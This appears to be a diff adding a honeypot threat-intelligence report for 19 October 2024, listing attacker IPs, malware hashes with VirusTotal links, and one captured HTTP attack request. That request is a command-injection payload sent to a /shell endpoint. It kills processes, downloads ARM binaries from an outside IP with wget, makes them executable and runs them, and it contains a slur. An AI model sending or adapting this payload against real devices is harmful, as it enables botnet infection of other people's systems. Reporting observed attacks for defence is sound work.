@@ -1,0 +1,32 @@
+Top 5 IPs for 19-10-2024 :
+
+37.131.74.43
+87.120.116.81
+62.122.184.252
+122.159.43.167
+195.178.110.67
+
+Malware Observed:
+
+File name : sshd
+c3369b8c2d0d7347b1f9c7d3a82c6d44c1b0543fb9f5626dc3c0c97690249713
+https://www.virustotal.com/gui/file/c3369b8c2d0d7347b1f9c7d3a82c6d44c1b0543fb9f5626dc3c0c97690249713
+ 
+340c8464c2007ce3f80682e15dfafa4180b641d53c14201b929906b7b0284d87
+https://www.virustotal.com/gui/file/340c8464c2007ce3f80682e15dfafa4180b641d53c14201b929906b7b0284d87
+
+a049df7b58b1f52f9f2f74bef29ec994d955e8cbaeab9d6e76dadc1763fdfc52
+https://www.virustotal.com/gui/file/a049df7b58b1f52f9f2f74bef29ec994d955e8cbaeab9d6e76dadc1763fdfc52
+
+
+Commands/exploits observed :
+
+GET /shell?kill+-9+-1;cd+/tmp;rm+arm+bin.armv7l;wget+http:/\\/178.215.238.13/bin.armv7l;chmod+777+bin.armv7l;./bin.armv7l+raped;wget+http:/\\/178.215.238.13/bin.armv4l;chmod+777+bin.armv4l;./bin.armv4l+raped HTTP/1.1
+Host: <Host IP>
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
